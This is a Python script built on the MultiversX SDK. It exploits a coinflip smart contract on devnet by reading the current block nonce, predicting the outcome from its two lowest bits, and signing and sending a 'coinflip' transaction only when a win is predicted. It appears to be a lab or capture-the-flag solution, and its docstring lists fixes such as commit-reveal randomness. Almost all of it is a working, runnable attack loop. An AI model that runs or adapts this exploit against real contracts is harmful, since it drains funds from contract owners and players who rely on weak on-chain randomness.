from multiversx_sdk import *
from pathlib import Path
import logging
import time

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class CoinflipExploiter:
    def __init__(self, pem_path: str):
        """
        Initialize exploiter with blockchain connection and wallet setup.
        
        MultiversX transactions require careful handling of data encoding:
        - Addresses must be in bech32 format for transaction creation
        - Transaction data must be encoded as bytes
        - Smart contract function calls need proper formatting
        
        Args:
            pem_path: Path to your wallet's PEM file
        """
        # First, let's make sure our wallet file exists
        wallet_path = Path(pem_path)
        if not wallet_path.exists():
            raise FileNotFoundError(f"Wallet file not found at: {pem_path}")
            
        # Set up our connection to the MultiversX devnet
        self.proxy = ProxyNetworkProvider("https://devnet-gateway.multiversx.com")
        
        # Load our wallet - this gives us the ability to sign transactions
        logger.info(f"Loading wallet from: {wallet_path.absolute()}")
        self.signer = UserSigner.from_pem_file(wallet_path)
        
        # Store both Address objects and their bech32 representations
        self.wallet_address = Address.from_hex(self.signer.get_pubkey().hex(), "erd")
        self.wallet_address_bech32 = self.wallet_address.bech32()
        
        # Store the contract's address - this is what we'll be interacting with
        self.contract_address = Address.from_bech32(
            "erd1qqqqqqqqqqqqqpgqmzaphnyv5gs0jkvr6sywtynj0s3a53rnd8ss29w0hr"
        )
        self.contract_address_bech32 = self.contract_address.bech32()
        
        # Set up network parameters for our transactions
        self.chain_id = "D"  # "D" indicates devnet
        self.gas_limit = 10000000  # Maximum computational resources we can use
        self.min_gas_price = 1000000000  # Cost per unit of computation
        
        logger.info(f"Wallet loaded successfully. Address: {self.wallet_address_bech32}")

    def analyze_block_nonce(self, nonce: int) -> tuple[bool, str]:
        """
        Analyze a block's nonce to predict if calling coinflip will result in a win.
        
        The contract uses block nonce bits to determine the outcome:
        block_nonce & 1 == block_nonce & 2
        
        By comparing these bits before submitting our transaction, we can
        predict and only play when we know we'll win.
        """
        # Extract the two bits we care about
        least_significant_bit = nonce & 1
        second_bit = (nonce & 2) >> 1
        will_win = least_significant_bit == second_bit
        
        explanation = f"""
        Block Analysis:
        --------------
        Block Nonce: {nonce}
        Binary: {bin(nonce)[2:].zfill(8)}
        Bit 0 (LSB): {least_significant_bit}
        Bit 1: {second_bit}
        Expected Result: {'WIN' if will_win else 'LOSE'}
        """
        return will_win, explanation

    def check_current_block(self) -> tuple[bool, int, str]:
        """
        Check the current block to see if calling coinflip would result in a win.
        """
        try:
            network_status = self.proxy.get_network_status()
            current_nonce = network_status.nonce
            will_win, analysis = self.analyze_block_nonce(current_nonce)
            return will_win, current_nonce, analysis
        except Exception as e:
            logger.error(f"Failed to check block: {e}")
            raise

    def execute_coinflip(self) -> str:
        """
        Execute a coinflip transaction when we've found a winning block.
        
        Transaction data in MultiversX must be properly encoded as bytes.
        For smart contract function calls, we encode the function name
        as UTF-8 bytes.
        """
        try:
            # First, get our current account state to get the correct nonce
            account = self.proxy.get_account(self.wallet_address)
            
            # Encode the function name as bytes
            data = "coinflip".encode()
            
            # Create transaction using bech32 addresses and properly encoded data
            tx = Transaction(
                nonce=account.nonce,
                value="0",
                sender=self.wallet_address_bech32,
                receiver=self.contract_address_bech32,
                gas_price=self.min_gas_price,
                gas_limit=self.gas_limit,
                chain_id=self.chain_id,
                data=data,
                version=1
            )
            
            # Get the message that needs to be signed
            message_to_sign = TransactionComputer().compute_bytes_for_signing(tx)
            
            # Sign the message and attach the signature
            tx.signature = self.signer.sign(message_to_sign)
            
            # Send the signed transaction to the network
            tx_hash = self.proxy.send_transaction(tx)
            logger.info(f"Transaction sent! Hash: {tx_hash}")
            return tx_hash
            
        except Exception as e:
            logger.error(f"Failed to execute coinflip: {e}")
            raise

def main(pem_path: str):
    """
    Main execution loop that monitors blocks and executes winning coinflips.
    
    This script exploits the contract's deterministic randomness. Rather than
    using a secure random number generator, the contract uses predictable bits
    from the block nonce. This allows us to:
    1. Monitor the current block nonce
    2. Analyze its bits to predict the outcome
    3. Only execute transactions when we know we'll win
    
    In a production environment, this vulnerability could be prevented by:
    - Using a secure random number generator
    - Making the random seed unpredictable
    - Implementing commit-reveal schemes for randomness
    """
    try:
        exploiter = CoinflipExploiter(pem_path)
        logger.info("Starting block monitoring with wallet enabled...")
        
        wins = 0
        attempts = 0
        
        while True:
            will_win, nonce, analysis = exploiter.check_current_block()
            print(analysis)
            
            if will_win:
                print("\nFOUND A WINNING BLOCK! ðŸŽ¯ Executing coinflip...")
                try:
                    tx_hash = exploiter.execute_coinflip()
                    attempts += 1
                    
                    print("Waiting for transaction confirmation...")
                    time.sleep(6)  # Wait for the blockchain to process our transaction
                    
                    # Check transaction status
                    status = exploiter.proxy.get_transaction_status(tx_hash)
                    
                    if status == "success":
                        wins += 1
                        print(f"Coinflip successful! Current record: {wins}/{attempts}")
                    else:
                        print(f"Transaction status: {status}")
                        
                except Exception as e:
                    print(f"Failed to execute winning move: {e}")
            
            time.sleep(1)  # Wait before checking next block
            
    except Exception as e:
        logger.error(f"Exploit failed: {e}")
        raise

if __name__ == "__main__":
    wallet_path = "./wallet.pem"  # Make sure your wallet.pem is in this location
    main(wallet_path)